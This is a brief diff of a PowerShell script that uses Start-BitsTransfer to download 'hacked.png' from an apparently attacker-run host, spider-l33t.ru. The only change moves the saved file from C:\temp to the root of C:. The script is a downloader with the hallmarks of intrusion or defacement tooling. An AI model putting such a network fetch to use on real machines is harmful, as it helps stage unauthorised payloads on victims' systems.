@@ -1,5 +1,5 @@
 $url = "http://spider-l33t.ru/files/hacked.png"
-$output = "C:\temp\hacked.png"
+$output = "C:\hacked.png"
 Import-Module BitsTransfer
 $job = Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 sleep 5;
